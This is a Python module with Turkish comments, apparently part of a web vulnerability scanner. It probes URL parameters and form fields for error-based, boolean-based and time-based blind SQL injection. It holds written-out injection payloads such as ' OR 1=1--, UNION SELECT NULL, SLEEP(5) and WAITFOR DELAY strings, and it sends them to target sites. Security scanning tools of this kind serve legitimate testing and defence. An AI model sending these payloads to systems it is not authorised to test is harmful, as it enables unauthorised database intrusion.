# -*- coding: utf-8 -*-
"""sql injection tarama modülü - error-based, boolean-based, time-based blind"""

import os
import re
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from moduller.temel_modul import TemelModul
from yapilandirma import (
    PAYLOAD_DIZINI,
    SQL_HATA_KALIPLARI,
    RISK_KRITIK,
    RISK_YUKSEK,
)
from yardimci import bilgi, basari, uyari


class SqlEnjeksiyonModulu(TemelModul):
    """sql injection açıklarını tarayan modül"""

    @property
    def isim(self):
        return "SQL Injection"

    @property
    def aciklama(self):
        return "error-based, boolean-based ve time-based blind sql injection tespiti"

    def __init__(self, istek_yonetici):
        super().__init__(istek_yonetici)
        self.payloadlar = self._payloadlari_yukle()

    def _payloadlari_yukle(self):
        """payload dosyasından sql injection payloadlarını yükler"""
        dosya_yolu = os.path.join(PAYLOAD_DIZINI, "sql_payloadlar.txt")
        try:
            with open(dosya_yolu, "r", encoding="utf-8") as dosya:
                return [satir.strip() for satir in dosya if satir.strip() and not satir.startswith("#")]
        except FileNotFoundError:
            uyari("sql payload dosyası bulunamadı, varsayılan payloadlar kullanılıyor")
            return self._varsayilan_payloadlar()

    def _varsayilan_payloadlar(self):
        """dosya bulunamazsa kullanılacak varsayılan payloadlar"""
        return [
            "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1",
            "' OR 1=1--", "\" OR 1=1--", "1' ORDER BY 1--",
            "' UNION SELECT NULL--", "'; WAITFOR DELAY '0:0:5'--",
        ]

    def tara(self, hedef_url, formlar=None, parametreli_urllar=None):
        """sql injection taramasını çalıştırır"""
        bilgi(f"sql injection taraması başlatılıyor: {hedef_url}")

        # parametreli url'leri tara
        if parametreli_urllar:
            for url in parametreli_urllar:
                self._url_parametrelerini_tara(url)

        # formları tara
        if formlar:
            for form in formlar:
                self._form_tara(form)

        bilgi(f"sql injection taraması tamamlandı — {len(self.bulgular)} bulgu")
        return self.bulgular

    def _url_parametrelerini_tara(self, url):
        """url parametrelerini sql injection için tarar"""
        parcalanmis = urlparse(url)
        parametreler = parse_qs(parcalanmis.query, keep_blank_values=True)

        for parametre_adi in parametreler:
            for payload in self.payloadlar:
                # parametreye payload enjekte et
                test_parametreleri = parametreler.copy()
                test_parametreleri[parametre_adi] = [payload]
                yeni_sorgu = urlencode(test_parametreleri, doseq=True)
                test_url = urlunparse((
                    parcalanmis.scheme, parcalanmis.netloc, parcalanmis.path,
                    parcalanmis.params, yeni_sorgu, parcalanmis.fragment,
                ))

                yanit = self.istek_yonetici.get(test_url)
                if yanit is None:
                    continue

                # error-based kontrol
                veritabani, hata_mesaji = self._hata_kontrol(yanit.text)
                if veritabani:
                    basari(f"sql injection bulundu (error-based): {test_url}")
                    self.bulgu_ekle(
                        url=url,
                        tip="SQL Injection (Error-based)",
                        risk=RISK_KRITIK,
                        aciklama=f"{veritabani} sql hatası tespit edildi — parametre: {parametre_adi}",
                        detay=f"veritabanı: {veritabani}, hata kalıbı: {hata_mesaji}",
                        payload=payload,
                        kanit=hata_mesaji,
                    )
                    break  # bu parametre için yeterli

        # boolean-based kontrol
        self._boolean_kontrol(url)

        # time-based kontrol
        self._time_based_kontrol(url)

    def _form_tara(self, form):
        """form alanlarını sql injection için tarar"""
        aksiyon = form["aksiyon"]
        metot = form["metot"]
        alanlar = form["alanlar"]

        for alan_adi, alan_bilgi in alanlar.items():
            if alan_bilgi["tip"] in ("hidden", "submit"):
                continue

            for payload in self.payloadlar[:10]:  # form için sınırlı payload
                test_verisi = {}
                for ad, bilgi_dict in alanlar.items():
                    if ad == alan_adi:
                        test_verisi[ad] = payload
                    else:
                        test_verisi[ad] = bilgi_dict["deger"] or "test"

                if metot == "POST":
                    yanit = self.istek_yonetici.post(aksiyon, veri=test_verisi)
                else:
                    yanit = self.istek_yonetici.get(aksiyon, parametreler=test_verisi)

                if yanit is None:
                    continue

                veritabani, hata_mesaji = self._hata_kontrol(yanit.text)
                if veritabani:
                    basari(f"sql injection bulundu (form): {aksiyon}")
                    self.bulgu_ekle(
                        url=aksiyon,
                        tip="SQL Injection (Error-based)",
                        risk=RISK_KRITIK,
                        aciklama=f"{veritabani} sql hatası tespit edildi — form alanı: {alan_adi}",
                        detay=f"veritabanı: {veritabani}, form: {aksiyon}, metot: {metot}",
                        payload=payload,
                        kanit=hata_mesaji,
                    )
                    break

    def _hata_kontrol(self, yanit_metni):
        """yanıt metninde sql hata kalıplarını arar"""
        yanit_kucuk = yanit_metni.lower()
        for veritabani, kaliplar in SQL_HATA_KALIPLARI.items():
            for kalip in kaliplar:
                if kalip.lower() in yanit_kucuk:
                    return veritabani, kalip
        return None, None

    def _boolean_kontrol(self, url):
        """boolean-based sql injection kontrolü"""
        parcalanmis = urlparse(url)
        parametreler = parse_qs(parcalanmis.query, keep_blank_values=True)

        for parametre_adi in parametreler:
            orijinal_deger = parametreler[parametre_adi][0] if parametreler[parametre_adi] else "1"

            # true koşulu
            true_parametreler = parametreler.copy()
            true_parametreler[parametre_adi] = [f"{orijinal_deger}' AND '1'='1"]
            true_sorgu = urlencode(true_parametreler, doseq=True)
            true_url = urlunparse((
                parcalanmis.scheme, parcalanmis.netloc, parcalanmis.path,
                parcalanmis.params, true_sorgu, parcalanmis.fragment,
            ))

            # false koşulu
            false_parametreler = parametreler.copy()
            false_parametreler[parametre_adi] = [f"{orijinal_deger}' AND '1'='2"]
            false_sorgu = urlencode(false_parametreler, doseq=True)
            false_url = urlunparse((
                parcalanmis.scheme, parcalanmis.netloc, parcalanmis.path,
                parcalanmis.params, false_sorgu, parcalanmis.fragment,
            ))

            true_yanit = self.istek_yonetici.get(true_url)
            false_yanit = self.istek_yonetici.get(false_url)

            if true_yanit is None or false_yanit is None:
                continue

            # yanıt uzunluk farkı analizi
            true_uzunluk = len(true_yanit.text)
            false_uzunluk = len(false_yanit.text)

            if true_uzunluk != false_uzunluk:
                fark = abs(true_uzunluk - false_uzunluk)
                # anlamlı bir fark varsa (en az %10)
                oran = fark / max(true_uzunluk, false_uzunluk, 1)
                if oran > 0.1:
                    basari(f"olası boolean-based sql injection: {url}")
                    self.bulgu_ekle(
                        url=url,
                        tip="SQL Injection (Boolean-based)",
                        risk=RISK_YUKSEK,
                        aciklama=f"boolean-based sql injection olasılığı — parametre: {parametre_adi}",
                        detay=f"true/false yanıt farkı: {fark} byte (%{oran*100:.1f})",
                        payload=f"' AND '1'='1 / ' AND '1'='2",
                    )

    def _time_based_kontrol(self, url):
        """time-based blind sql injection kontrolü"""
        parcalanmis = urlparse(url)
        parametreler = parse_qs(parcalanmis.query, keep_blank_values=True)

        zaman_payloadlari = [
            "' OR SLEEP(5)-- ",
            "'; WAITFOR DELAY '0:0:5'-- ",
            "' OR pg_sleep(5)-- ",
        ]

        for parametre_adi in parametreler:
            # önce normal yanıt süresini ölç
            normal_sure = self.istek_yonetici.yanit_suresi_olc(url)
            if normal_sure is None:
                continue

            for payload in zaman_payloadlari:
                test_parametreleri = parametreler.copy()
                test_parametreleri[parametre_adi] = [payload]
                test_sorgu = urlencode(test_parametreleri, doseq=True)
                test_url = urlunparse((
                    parcalanmis.scheme, parcalanmis.netloc, parcalanmis.path,
                    parcalanmis.params, test_sorgu, parcalanmis.fragment,
                ))

                test_sure = self.istek_yonetici.yanit_suresi_olc(test_url)
                if test_sure is None:
                    continue

                # 4 saniyeden fazla gecikme varsa
                if test_sure - normal_sure > 4:
                    basari(f"time-based blind sql injection bulundu: {url}")
                    self.bulgu_ekle(
                        url=url,
                        tip="SQL Injection (Time-based Blind)",
                        risk=RISK_KRITIK,
                        aciklama=f"time-based blind sql injection — parametre: {parametre_adi}",
                        detay=f"normal süre: {normal_sure:.2f}s, test süresi: {test_sure:.2f}s",
                        payload=payload,
                    )
                    break
